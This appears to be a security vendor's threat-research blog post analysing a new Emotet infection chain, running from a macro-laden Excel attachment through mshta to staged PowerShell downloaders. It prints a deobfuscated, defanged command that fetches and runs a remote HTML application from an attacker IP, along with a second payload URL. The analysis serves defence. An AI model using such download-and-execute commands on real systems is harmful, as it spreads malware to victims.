Executive Summary
As early as Dec. 21, 2021, Unit 42 observed a new infection method for the highly prevalent
malware family Emotet. Emotet is high-volume malware that often changes and modifies its
attack patterns. This latest modification of the Emotet attack follows suit.
The new attack delivers an Excel file through email, and the document contains an
obfuscated Excel 4.0 macro. When the macro is activated, it downloads and executes an
HTML application that downloads two stages of PowerShell to retrieve and execute the final
Emotet payload.

Palo Alto Networks customers are protected from Emotet and similar malware families using
similar obfuscation techniques with Cortex XDR or the Next-Generation Firewall with the
WildFire and Threat Prevention security subscriptions.

History of Emotet
Emotet was first discovered as a banking trojan in 2014, and it has been very active in recent
years. In January 2021, law enforcement and judicial agencies took down the Emotet botnet
infrastructure, but Emotet returned in November 2021 and has remained active since then.
Emotet frequently uses thread hijacking as part of its attack method. As described in our
previous blog on Emotet’s thread hijacking, this technique generates fake replies based on
legitimate emails stolen from mail clients of Windows hosts previously infected with Emotet.
The botnet uses this stolen email data to create fake replies impersonating the original
senders.
Using thread hijacking and other types of emails, Emotet has implemented different infection
methods since its return. Most notable were emails with links to install a fake Adobe
Windows App Installer Package in December 2021. After a holiday break, Emotet returned to
attachment-based emails in January 2022. As early as Dec. 21, 2021, Emotet started using a
new infection method, which we describe in this blog.
In some cases, Emotet uses a password-protected zip archive as an attachment to its email.
In other cases, Emotet uses an Excel spreadsheet directly attached to the email.

Example of an Initial Email Lure

2/8

Shown in Figure 1, this example of an initial email lure sent by Emotet is a recent example of
Emotet’s thread hijacking. The stolen email thread is from June 2021, and this email was
sent by the Emotet botnet on Jan. 27, 2022. This example contains an encrypted zip file in
an attempt to bypass security systems. The password to the zip file is included in the email,
so that the victim can extract the contents.

Excel Document
The encrypted zip file contains a single Excel document with Excel 4.0 macros. These
macros are an old Excel feature that is frequently abused by malicious actors. The victim
must enable macros on a vulnerable Windows host before the malicious content is activated.

Figure 2. Excel 4.0 macro document.
When the macro code is enabled, it executes cmd.exe to run mshta.exe with an argument to
retrieve and execute a remote HTML application. The code utilizes hex and character
obfuscation in order to attempt to bypass static detection measures. The deobfuscated
command string that is executed is: cmd /c mshta hxxp://91.240.118[.]168/se/s.html

Figure 3. Excel 4.0 macro code that executes cmd and mshta.
The HTML application shown in Figure 4 is highly obfuscated. It will download and execute
additional PowerShell code.

PowerShell
The initial obfuscated PowerShell script shown in Figure 5 connects to
hxxp://91.240.118[.]168/se/s.png. This URL returns text-based script for a second-stage set
of PowerShell code designed to retrieve an Emotet binary.

Figure 5. Initial PowerShell downloader.
This second-stage PowerShell code shown in Figure 6 contains 14 URLs to retrieve the
Emotet binary. The script attempts each URL until an Emotet binary is successfully
downloaded. Having multiple URLs makes this attack more resilient in the event that one of
the URLs is taken down.

attack chain.

Conclusion
Emotet is a highly-active malware family that frequently changes its infection techniques.
These changes are likely an attempt to avoid detection. Emotet’s new attack chain reveals
multiple stages with different file types and obfuscated script before arriving at the final
Emotet payload.
Palo Alto Networks customers are protected from malware families using similar obfuscation
techniques with Cortex XDR or the Next-Generation Firewall with WildFire and Threat
Prevention security subscriptions.
